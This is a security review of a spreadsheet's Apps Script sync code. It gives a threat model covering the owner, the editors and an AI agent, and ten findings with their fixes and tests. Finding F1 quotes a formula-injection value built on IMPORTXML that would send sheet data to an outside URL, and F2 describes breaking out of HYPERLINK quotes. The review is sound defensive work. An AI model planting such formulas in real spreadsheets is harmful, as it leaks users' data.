# Security review of the review sheet's Apps Script (Code.gs)

**Date:** 2026-10-31. **Asked by:** the owner ("do full QA security review on
code.gs. record findings"). **Scope:** `tools/review-sheet-sync/review-sheet.gs`
as built into `Code.gs` on core#328, its manifest `appsscript.json`, and how
the two templates and the logs lock their columns. **Method:** a read of
every write the script makes (`setValues`, `setRichTextValues`, link URLs,
document properties, triggers, validation), what reaches each one, and who
can edit it. Each finding that could be fixed was fixed in the same PR and
has a regression test, either in `review-sheet.test.ts` (the tests named
"security: …") or in `review-sheet-security.test.ts`.

## Threat model

- **The owner** (informatics.avengers) installs the script and authorises
  it. Its installable triggers run **as the owner**, whoever's edit fires
  them.
- **Editors** (contributors, architects, editors) may type only in the blue
  and orange columns. Every other column and tab is locked to the owner.
  Their edits fire `markDirty`, so they can make owner-run code read what
  they typed.
- **The agent** writes the Agent tab, the Config tab and the `(agent)`
  columns as the owner. Its text may echo what contributors wrote: issues and
  feedback are untrusted input to the agent.
- **Out of scope:** Google account security, and someone who already owns
  the sheet.

## Findings

| # | Severity | Finding | Status |
|---|---|---|---|
| F1 | High | **Formula injection on write-back.** `setValues` makes any string starting with `=`, `+`, `-` or `@` a formula. The script wrote back as plain values the agent's proposal (on stale flag or unflag), repaired Selected Sections picks, TOC names and anchors, and a non-numeric No. A proposal that echoed a contributor's `=IMPORTXML("https://…?"&A1,…)` would have become a live formula **in an owner-locked cell**, able to send sheet data to an outside URL. | **Fixed:** every such value goes through `asText()`, which puts an apostrophe in front (Sheets doesn't show it). Test: "text a person or the agent typed is never written back as a formula". |
| F2 | Medium | **Quote breakout in `HYPERLINK`.** The No. link and the TOC link were built by string concatenation: a `"` in No., Comment ref, an anchor or a Config URL closes the string and appends formula code. | **Fixed:** `q()` doubles quotes inside every formula string. Test: "a quote in No. cannot break out of the HYPERLINK formula". |
| F3 | Low | **The links come from owner-locked tabs.** Issue and PR links match only `https://github.com/…/issues/n` and `/pull/n`. The Staging review link takes any `https://` URL from the Agent tab, and section links take their base from Config. Both tabs are agent-only, so a contributor can't plant a link. | Accepted. Keep the Agent and Config tabs locked to the owner. |
| F4 | Medium (availability) | **Property overflow stops the refresh.** A document property holds 9 kB. The incremental row list (a large paste) and one JSON value of every change set's Agent hash (about 450 change sets) would pass that, and `setProperty` would throw on every edit. | **Fixed:** more than 200 edited rows triggers a full rebuild instead of a list, and each change set's hash is its own property (`a:CS-nnn`). Test: "a large paste rebuilds everything rather than overflow a property". |
| F5 | Info | **Editors' edits run owner code.** That's how an installable trigger works, and it's needed so the output columns can stay locked. The code reads only this spreadsheet (`@OnlyCurrentDoc`). It makes no network calls, sends no mail and doesn't use Drive or `eval` (`review-sheet-security.test.ts`), and after F1 and F2 it writes no editor-typed text as a formula. | Accepted. The skill's "Trusting the script" section now says this, instead of "editors never run it". |
| F6 | Low | **Unlimited change-set ids.** Any filled row gets a CS id, and the agent opens a GitHub issue for each one, so an editor could flood the repository with issues. | The agent's job: open an issue only for a row with a Title or feedback text, and stop and ask a person past a batch of 20 new ones in one sync. Recorded in the skill. |
| F7 | Info | **The stale hash isn't cryptographic.** `hashOf` is 32-bit djb2. A collision would only stop a "stale" flag from showing, and wouldn't give access to anything. | Accepted. |
| F8 | Info | **No personal data.** The script never reads who is editing (no `Session`), and no reviewer emails reach agent cells. Locks name only the owner. | No action. |
| F9 | Info | **Config is trusted.** `JSON.parse` only, no code. A Config written for another spreadsheet stops the script (`CFG.SHEET` against the spreadsheet id). | No action. |
| F10 | Low | **The dropdown accepts invalid values.** `checkDropdown` creates the rule with `setAllowInvalid(true)`, so a pasted value still lands, gets repaired, or is flagged in Section links. Typed formulas are handled by F1. | Accepted, on purpose: rejecting values loses people's input. |

## Re-checking

`bun test tools/review-sheet-sync` runs all of the above. Re-review whenever the
script gains a new write sink (any `setValues`, formula or link), a new
service, or a new tab that editors can write to.
